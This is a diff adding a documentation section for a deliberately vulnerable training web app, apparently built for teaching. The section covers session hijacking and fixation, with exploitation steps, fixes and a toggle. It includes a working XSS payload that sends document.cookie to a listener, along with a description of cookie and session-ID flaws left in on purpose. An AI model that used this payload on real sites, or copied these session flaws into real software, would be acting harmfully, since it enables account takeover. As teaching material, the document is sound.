@@ -209,3 +209,55 @@ Jinja2's context-aware auto-escaping securely translates the injected HTML tags 
 - **Config Flag:** `config.VULN_MODE["xss"]` (Shares the general XSS toggle)
 - Set to `True` to use the `| safe` filter (disabling auto-escaping).
 - Set to `False` to rely on Jinja2's default auto-escaping (safely rendering HTML).
+
+---
+
+## Page 7: Dashboard — Session Hijacking & Session Fixation
+
+### Page Structure
+- **Route Path:** `/dashboard` and `/set_session`
+- **Template File:** `templates/dashboard.html`
+- **Form Fields:** N/A (Targets authentication state management directly)
+- **Backend File/Function Involved:** `app.py`, `modules/sqli.py` (login logic), and `modules/session_hijack.py`
+
+### Vulnerability Type & OWASP Category
+Session Hijacking & Session Fixation — **A07:2021-Identification and Authentication Failures**
+
+### Root Cause
+This module demonstrates two distinct root causes that lead to authentication failure:
+
+1. **Insecure Session Cookie Flags (Hijacking):** The application issues the `session` cookie without the `HttpOnly`, `Secure`, and `SameSite` flags. Most critically, missing `HttpOnly` means client-side JavaScript can freely read the cookie via `document.cookie`. This makes the session highly vulnerable to theft if an XSS vulnerability exists anywhere on the domain.
+2. **Failure to Regenerate Session ID (Fixation):** Upon successful authentication, the backend codebase binds the user's logged-in state to whatever session ID already existed in the browser before they logged in. It fails to clear and regenerate a brand new session identifier, allowing an attacker to "fix" the session ID to a known value prior to the victim authenticating.
+
+### Exploitation Steps
+
+#### Demo A: Cookie Theft (via XSS)
+1. In a separate terminal, start the attacker listener: `python attacks/listener.py`.
+2. As the attacker, navigate to the Guestbook (`/comments`) and submit this payload:
+   `<script>fetch('http://127.0.0.1:9001/steal?c='+document.cookie)</script>`
+3. As the victim, log in normally, then visit the Guestbook. The malicious script silently runs and beams the victim's session cookie to the attacker's terminal.
+4. As the attacker, open `attacks/session_hijack_theft.py`, paste the stolen cookie value into the script, and run it. The script successfully requests `/dashboard` and retrieves the victim's private data without a password.
+
+#### Demo B: Session Fixation
+1. As the attacker, run `python attacks/session_fixation.py` in your terminal.
+2. The script simulates an attacker setting up a trap by generating a known session ID and sending the victim a malicious link: `/set_session?sessionid=HACKER_CONTROLLED_SESSION_123`.
+3. The script simulates the victim clicking the link (which forces their browser to adopt the attacker's session ID) and then logging in normally.
+4. Because the server fails to regenerate the ID upon login, the victim's account is now permanently bound to the attacker's known ID.
+5. The attacker script automatically replays its pre-existing session cookie and successfully accesses the `/dashboard` directly as the victim.
+
+### Impact
+- **Severity:** Critical
+- **Gain:** Complete Account Takeover. Whether the attacker steals an active session (Hijacking) or forces a known session before login (Fixation), the end result is identical: the attacker bypasses the entire authentication mechanism and gains full, unauthorized access to the victim's account and data.
+
+### Fix Applied
+The patched version resolves both vulnerabilities simultaneously by implementing defense-in-depth:
+
+1. **`HttpOnly=True`:** Prevents client-side scripts from reading the cookie, completely neutralizing XSS-based cookie theft.
+2. **`Secure=True`:** Ensures the cookie is only transmitted over encrypted HTTPS connections, preventing network interception (packet sniffing).
+3. **`SameSite=Lax` (or `Strict`):** Prevents the browser from sending the cookie along with cross-site requests, mitigating Cross-Site Request Forgery (CSRF).
+4. **Session Regeneration:** The login route now explicitly calls `session.clear()` and assigns a cryptographically secure, brand new session ID immediately upon successful authentication. Any pre-existing (potentially fixated) session ID is destroyed.
+
+### How to Toggle
+- **Config Flag:** `config.VULN_MODE["session"]`
+- Set to `True` to disable secure cookie flags and reuse session IDs on login.
+- Set to `False` to enforce `HttpOnly`/`SameSite` flags and regenerate session IDs securely.
